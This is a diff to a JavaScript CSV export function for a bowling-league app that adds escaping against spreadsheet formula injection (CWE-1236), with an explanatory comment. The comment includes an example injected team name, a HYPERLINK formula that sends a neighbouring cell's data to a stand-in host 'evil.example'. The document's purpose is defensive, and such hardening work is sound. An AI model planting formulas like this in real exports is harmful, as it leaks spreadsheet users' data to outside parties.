@@ -17,9 +17,38 @@ const SESSION_COLUMNS = [
   "poker_won", "high_game_won", "net_money",
 ];
 
+// Quoting a cell keeps the FILE well-formed. It does nothing about what
+// the spreadsheet does with the text once it has stripped those quotes
+// back off -- and Excel, Sheets and LibreOffice all treat a value
+// starting with = + - @ (or a tab/carriage return) as a FORMULA.
+//
+// So a team named
+//   =HYPERLINK("https://evil.example/?x="&A1,"Standings")
+// travels through a perfectly valid CSV and becomes a live formula in
+// the spreadsheet of whoever exports their season -- reading a
+// neighbouring cell and sending it off-site when clicked. The DDE
+// variants are worse. This is CWE-1236, and it is worth taking
+// seriously here specifically because names are not always your own:
+// team names, rosters and friends all arrive from other people's
+// accounts.
+//
+// The fix is a leading apostrophe, which every spreadsheet reads as
+// "this is text" and does not display as part of the value.
+//
+// NUMBERS ARE LEFT ALONE, deliberately. net_money is routinely negative,
+// and prefixing "-25" would turn a number the bowler wants to sum into
+// text -- breaking the export to fix a threat that a plain number does
+// not carry. Only a leading "-" that is NOT simply a number is escaped.
+function isPlainNumber(s) {
+  return /^-?\d+(\.\d+)?$/.test(s);
+}
+
 function csvCell(v) {
   if (v === null || v === undefined) return "";
-  const s = String(v);
+  let s = String(v);
+  if (/^[=+@\t\r]/.test(s) || (s.startsWith("-") && !isPlainNumber(s))) {
+    s = `'${s}`;
+  }
   // Quote anything that could break a row: commas, quotes, newlines.
   return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
